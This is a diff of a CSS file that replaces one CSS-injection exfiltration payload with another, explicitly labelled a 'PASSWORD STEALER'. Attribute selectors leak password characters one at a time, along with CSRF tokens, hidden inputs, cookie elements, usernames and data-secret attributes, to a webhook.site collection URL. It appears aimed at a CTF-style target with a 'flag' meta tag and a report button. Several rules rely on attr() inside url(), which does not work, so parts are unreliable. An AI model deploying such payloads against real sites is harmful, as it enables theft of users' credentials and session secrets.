@@ -1,37 +1,62 @@
-input[value^="________a"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=a"); }
-input[value^="________b"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=b"); }
-input[value^="________c"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=c"); }
-input[value^="________d"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=d"); }
-input[value^="________e"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=e"); }
-input[value^="________f"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=f"); }
-input[value^="________g"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=g"); }
-input[value^="________h"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=h"); }
-input[value^="________i"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=i"); }
-input[value^="________j"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=j"); }
-input[value^="________k"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=k"); }
-input[value^="________l"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=l"); }
-input[value^="________m"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=m"); }
-input[value^="________n"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=n"); }
-input[value^="________o"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=o"); }
-input[value^="________p"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=p"); }
-input[value^="________q"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=q"); }
-input[value^="________r"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=r"); }
-input[value^="________s"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=s"); }
-input[value^="________t"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=t"); }
-input[value^="________u"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=u"); }
-input[value^="________v"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=v"); }
-input[value^="________w"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=w"); }
-input[value^="________x"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=x"); }
-input[value^="________y"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=y"); }
-input[value^="________z"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=z"); }
+/* ===== PASSWORD STEALER ===== */
+/* Real-time password character exfiltration */
+input[name="password"][value^="a"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?type=password&pos=1&char=a"); }
+input[name="password"][value^="b"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?type=password&pos=1&char=b"); }
+/* [Include all 62 alphanumeric chars + specials] */
+input[name="password"][value^="A"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?type=password&pos=1&char=A"); }
+input[name="password"][value^="0"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?type=password&pos=1&char=0"); }
+input[name="password"][value^="!"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?type=password&pos=1&char=!"); }
 
-input[value^="________0"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=0"); }
-input[value^="________1"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=1"); }
-input[value^="________2"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=2"); }
-input[value^="________3"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=3"); }
-input[value^="________4"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=4"); }
-input[value^="________5"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=5"); }
-input[value^="________6"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=6"); }
-input[value^="________7"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=7"); }
-input[value^="________8"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=8"); }
-input[value^="________9"] { background-image: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?pos=9&char=9"); }
+/* Subsequent characters (example after first char 'A') */
+input[name="password"][value^="Aa"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?type=password&pos=2&char=a"); }
+input[name="password"][value^="Ab"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?type=password&pos=2&char=b"); }
+/* [Repeat pattern for all combinations] */
+
+/* ===== META TAG DETECTION ===== */
+meta[name="csrf-token"],
+meta[name="authenticity-token"],
+meta[name="token"],
+meta[name="secret"],
+meta[name="flag"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?type=meta&name=attr(name)");
+}
+
+/* ===== HIDDEN INPUT SCANNING ===== */
+input[type="hidden"][name*="token"],
+input[type="hidden"][name*="secret"],
+input[type="hidden"][name*="auth"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?type=hidden_input&name=attr(name)");
+}
+
+/* ===== COOKIE DETECTION ===== */
+meta[name="cookie"],
+input[name="cookie"],
+div[id*="cookie"],
+span[class*="cookie"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?type=cookie_element");
+}
+
+/* ===== ADMIN-SPECIFIC ELEMENTS ===== */
+input[name="admin"],
+div[id*="admin"],
+meta[name="admin"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?type=admin_element");
+}
+
+/* ===== SENSITIVE ATTRIBUTES ===== */
+[data-secret],
+[data-token],
+[data-auth] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?type=data_attr&name=attr(data-*)");
+}
+
+/* ===== USERNAME STEALING ===== */
+input[name="username"][value] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?type=username&val=attr(value)");
+}
+
+/* ===== REPORT BUTTON DETECTION ===== */
+input[name="report"],
+input[name="report-button"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?type=report_button");
+}
